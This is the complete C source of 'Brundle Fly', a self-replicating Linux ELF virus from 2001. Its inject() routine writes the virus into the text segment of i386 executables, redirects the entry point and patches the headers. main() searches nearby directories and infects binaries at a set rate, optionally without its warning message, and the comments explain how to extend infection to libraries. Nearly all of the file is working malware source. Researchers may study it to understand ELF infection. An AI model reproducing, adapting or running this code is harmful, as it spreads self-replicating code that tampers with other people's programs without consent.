
/*
 * Brundle Fly - Good-natured Linux ELF virus supporting kernel 2.2 and 2.4
 * Copyright 2001 Konrad Rieck <kr@roqe.org>, Konrad Kretschmer <kk@roqe.org>
 * In memory to Seth Brundle 
 *
 * This file is the actual Brundle Fly virus. It performs the replication.
 * Read through the source in order to find all important parts of the 
 * code.  
 *
 * $Id: brundle-fly-proto.c,v 1.14 2001/07/11 18:34:48 kr Exp $
 */

#include <sys/types.h>
#include <config.h>
#include <structs.h>
#include <syscalls.h>
#include <brundle-fly.h>
#include <elfio.h>

/*
 * A simple function that tries to find the binary filename in the
 * hard-coded path given by path_env. A temporary space tmp has to be
 * provided in order to construct the different paths. 
 */
char *get_path(char *filename, char *tmp, char *path_env)
{
    char *p, *t, *f;
    int i, found = 0;

    /*
     * If the filename starts with / or . return. 
     */
    if (*filename == '/' || *filename == '.')
	return filename;

    p = path_env;

    while (!found && *p != 0) {
	t = tmp;
	f = filename;

	/*
	 * Add a path from path_env to t
	 */
	for (; *p != ':'; p++, t++)
	    *t = *p;

	/*
	 * Append the filename f to t
	 */
	for (; *f != 0; f++, t++)
	    *t = *f;
	*t = 0;

	/*
	 * Check if the constructed filename exists
	 */
	if (access(tmp, F_OK) > -1)
	    return tmp;

	p++;
    }

    /*
     * If the file could not be found the given paths return the 
     * original filename. 
     */
    return filename;
}

/* 
 * This functions copies len bytes from src to dst. It doesn't keep track
 * of the file position pointers, lseek() instruction have to be issued
 * before calling copy().
 */
void copy(int src, int dst, size_t len)
{
    int i, r = PAGE_SIZE;
    char buf[PAGE_SIZE];

    /*
     * Use chunks of PAGE_SIZE for copying in order to avoid dynamic
     * memory allocation. 
     */
    for (i = len; i > 0; i -= PAGE_SIZE) {
	if (i < PAGE_SIZE)
	    r = i;
	read(src, buf, r);
	write(dst, buf, r);
    }
}

/*
 * This is the workhorse of Brundle Fly. It infects host by the virus 
 * included in source. The file tmp is used to construct the copy and
 * at the end moved to the host filename. 
 */
int inject(char *host, char *source, char *tmp)
{
    int src, dst, i;
    unsigned long shdrs_len, phdrs_len, virt_start;
    unsigned long real_start, secstart, position;

    /*
     * These five values have to patched after the virus has been compiled. 
     * They include information about the compiled virus, such as where it
     * starts (virus_start), where the host should enter virus
     * (virus_entry), where the virus has to jump after execution
     * (host_entry), the virus length (virus_length) and the offset of the
     * virus_start field (virus_start_off).
     */
    unsigned long virus_entry = 0xabcdabcd;
    unsigned long host_entry = 0xfeedfeed;
    unsigned long virus_length = 0xbefabefa;
    unsigned long virus_start = 0xfacafaca;
    int virus_start_off = 0xfaabfaab;

    char virus_data[PAGE_SIZE];

    Elf_Phdr *phdrs, *ptmp;
    Elf_Shdr *shdrs, *stmp;
    Elf_Ehdr ehdr;
    struct stat st;

    /*
     * Check we have write permission and the host is executable. Brundle
     * Fly can also infect libraries since those are relatively equaly to
     * executable binaries. Remove the X_OK check to infect libraries.
     */
    if (access(host, X_OK | W_OK | F_OK) < 0)
	goto error;

    /*
     * Open the source file and copy the complete virus to the array
     * virus_data. As you can see we use virus_start and virus_length. 
     * That's why they need to be patched later (elf2bin).  
     */
    src = open(source, O_RDONLY, 0);
    lseek(src, virus_start, SEEK_SET);
    read(src, virus_data, virus_length);
    close(src);

    /*
     * Open the host file and the tmp file. If this is not possible,
     * be a good boy and return. 
     */
    if ((src = open(host, O_RDONLY, 0)) < 0)
	goto error;
    if ((dst = open(tmp, O_WRONLY | O_CREAT, 0600)) < 0)
	goto error;

    /*
     * Retrieve stats about the host file. We will later need the host
     * file size, its modes and its owner. 
     */
    if (fstat(src, &st) < 0)
	goto error;

    /*
     * Read the ELF header in to memory. The ehdr struct is on the stack, 
     * therefore we don't need to care for dynamic memory. 
     */
    if (read(src, (char *) &ehdr, sizeof(Elf_Ehdr)) < sizeof(Elf_Ehdr))
	goto error;

    /*
     * Check if this really is an ELF file, that is either exectuable
     * or includes dynamically linkable code. Last but not least check
     * if this is really i386 code, we don't want to play with those 
     * SPARC / MIPS / ... Linux freaks. 
     */
    if (ehdr.e_ident[0] != ELFMAG0 || ehdr.e_ident[1] != ELFMAG1 ||
	ehdr.e_ident[2] != ELFMAG2 || ehdr.e_ident[3] != ELFMAG3 ||
	(ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
	ehdr.e_machine != EM_386)
	goto error;

    shdrs_len = sizeof(Elf_Shdr) * ehdr.e_shnum;
    phdrs_len = sizeof(Elf_Phdr) * ehdr.e_phnum;

    /*
     * After calculating the size for the section and the program headers,
     * we need to allocate the necessary memory. Brundle Fly is optimised
     * for size, virt_start is used as a temporary variable don't get
     * confused.
     */
    virt_start = brk(0);
    i = virt_start + shdrs_len + phdrs_len;

    /*
     * If for some reason, we cannot allocate the memory, we leave
     * everything behind, working with not allocated memory causes
     * suspicious segmentation faults.
     */
    if (brk(i) != i)
	goto error;

    /*
     * We set the both pointers to our new allocated memory. 
     */
    phdrs = (Elf_Phdr *) virt_start;
    shdrs = (Elf_Shdr *) (virt_start + phdrs_len);

    /*
     * Now it's time to read in the program and section headers. We are not
     * checking for errors. In case something goes wrong from this point on,
     * erhm, bad luck!
     */
    lseek(src, ehdr.e_phoff, SEEK_SET);
    read(src, (char *) phdrs, phdrs_len);
    lseek(src, ehdr.e_shoff, SEEK_SET);
    read(src, (char *) shdrs, shdrs_len);


    /*
     * Iterate through the different program headers and look for a segment
     * that olds the text segment. Also check that this segment has equal
     * memory size and file size. If file size and memory size don't match,
     * this segment has a bss section at the end. 
     */
    for (i = 0, ptmp = phdrs; i < ehdr.e_phnum; i++, ptmp++)
	if (ptmp->p_type == PT_LOAD && ptmp->p_memsz == ptmp->p_filesz)
	    break;

    /*
     * Oops, we could not find a suitable text segment, time to leave,
     * there is nothing to do, this file is already broken. 
     */
    if (i == ehdr.e_phnum)
	goto error;

    /*
     * Set virt_start to the virtual address the virus will start at and
     * set real_start to the physical address the virus will start at. 
     */
    virt_start = ptmp->p_vaddr + ptmp->p_filesz;
    real_start = ptmp->p_offset + ptmp->p_filesz;

    /*
     * Patch the virus code for our victim host. Set the host_entry variable
     * to point to ehdr.entry and the set virus_start to real_start (done by
     * using our varibale virus_start_off).
     */
    *(int *) &virus_data[host_entry] = ehdr.e_entry;
    *(int *) &virus_data[virus_start_off] = real_start;

    /*
     * After saving the ehdr.entry in host_entry, override it in the ELF
     * header by our virus_entry + the virutal address the virus starts at.
     */
    ehdr.e_entry = virt_start + virus_entry;

    /*
     * We increased the text segment, therefore adjust the size of this
     * segment in memory and in the file. 
     */
    ptmp->p_memsz = ptmp->p_filesz += virus_length;

    /*
     * Check if there is enough space in the text segment for Brundle Fly. 
     * This is done by & (PAGE_SIZE - 1) (similar to a modulus instruction,
     * but shorter). 
     */
    if (PAGE_SIZE - (virt_start & (PAGE_SIZE - 1)) < virus_length)
	goto error;

    /*
     * The file size has been increased, therefore it is necessary to 
     * adjust the offset of all following program headers. 
     */
    for (i++, ptmp++; i < ehdr.e_phnum; i++, ptmp++)
	ptmp->p_offset += PAGE_SIZE;

    /*
     * Same goes for the section headers. All section headers after the
     * injected virus have to be adjusted. The section that close to our
     * code has to be increased.
     */
    for (i = 0, stmp = shdrs; i < ehdr.e_shnum; i++, stmp++)
	if (stmp->sh_offset >= real_start)
	    stmp->sh_offset += PAGE_SIZE;
	else if (stmp->sh_addr + stmp->sh_size == virt_start)
	    stmp->sh_size += virus_length;

    secstart = ehdr.e_shoff;

    /*
     * If Brundle Fly was injected before ALL sections adjust the section
     * offset in the ELF header.
     */
    if (ehdr.e_shoff >= real_start)
	ehdr.e_shoff += PAGE_SIZE;

    /*
     * Write the patched ELF header and the program headers to our temporary
     * file.
     */
    write(dst, (char *) &ehdr, sizeof(Elf_Ehdr));
    write(dst, (char *) phdrs, phdrs_len);

    /*
     * Set the position in our source file. 
     */
    position = phdrs_len + sizeof(Elf_Ehdr);
    lseek(src, position, SEEK_SET);

    /* 
     * Copy all data from the end of the program headers to the start
     * of the virus. 
     */
    copy(src, dst, real_start - position);

    /*
     * Insert the virus. Actually the virus length is below PAGE_SIZE,
     * but we need to write a complete page. If there is junk at the 
     * end of virus_data, no problem, noone cares. 
     */
    write(dst, virus_data, PAGE_SIZE);

    /*
     * Copy all data from the end of the virus to the start of the
     * section headers. 
     */
    copy(src, dst, secstart - real_start);

    /*
     * Write the patched section headers. 
     */
    write(dst, (char *) shdrs, shdrs_len);

    /* 
     * Now copy the rest to our temporary file. 
     */
    position += shdrs_len + secstart - position;
    copy(src, dst, (st.st_size - position));

    close(src);

    /*
     * Rename our temporary file to the host file, set the original mode
     * and ownership. Voila. 
     */
    rename(tmp, host);
    fchmod(dst, st.st_mode);
    fchown(dst, st.st_uid, st.st_gid);
    close(dst);

    return 1;
  error:
    return 0;
}

/* 
 * This is the main function of Brundle Fly. It is used to receive the 
 * argument argv[0] that olds the filename of the source. 
 */
int main(int argc, char *argv[])
{
    struct dirent *d;
    int dir, i, count, filename, j;

    char *s0 = "./", *s1 = ".././", *s2 = "../.././";
    char *path_env = "/bin/:/usr/bin/:/usr/sbin/:/usr/local/bin/:./bin/:";
    char *source, *path, *ptr1, *ptr2, *ptr3;
    char dirents[PAGE_SIZE], buf[256];

    source = get_path((char *) argv, buf, path_env);

#ifdef PROPAGATION

    /* 
     * If compiled with PROPAGATION, get the current unix time and select
     * either to search the dir ., .. or even ../... 
     */
    j = time(0);
    switch (j % 3) {
    case 0:
	path = s0;
	break;
    case 1:
	path = s1;
	break;
    case 2:
	path = s2;
    }

    if ((dir = open(path, O_RDONLY, 0)) < 0)
	goto error;

    /*
     * Get the directory entries for the selected directory. Only PAGE_SIZE
     * is provided for temporary storage. 
     */
    count = getdents(dir, (struct dirent *) &dirents, PAGE_SIZE);
    close(dir);

    /*
     * Allocate memory for our filename.
     */
    filename = brk(0);
    if (brk(filename + 256) < filename + 256)
	goto error;

    /*
     * Perpare several pointers, this is weird code. Since we may not 
     * use any data stored in the .data segment, we have to work with a 
     * lot of pointers that are stored on the stack. 
     */
    ptr1 = (char *) filename;
    d = (struct dirent *) &dirents;

    for (; *path != 0; ptr1++, path++)
	*ptr1 = *path;
    ptr3 = ptr1;

    /*
     * Iterate through the directory and infect a binary with a rate of
     * INFECTION_RATE. 
     */
    for (i = 0; i < count && i < PAGE_SIZE && d->d_reclen;
	 i += d->d_reclen) {

	if (j % INFECTION_RATE == 0) {

	    for (ptr2 = d->d_name; *ptr2 != 0; ptr1++, ptr2++)
		*ptr1 = *ptr2;
	    *ptr1 = 0;

	    inject((char *) filename, source, ".. ");
	    ptr1 = ptr3;
	}

	d = (struct dirent *) (((char *) d) + d->d_reclen);
	j++;
    }
#else
    /*
     * In non-propagation mode, just in fact the file ./host. This is a 
     * good way to test the virus. 
     */
    inject("./host", source, ".. ");
#endif

#ifndef SILENT
    write(1, "WARNING: brundle-fly infected!\n", 31);
#endif

  error:
    return 0;
}
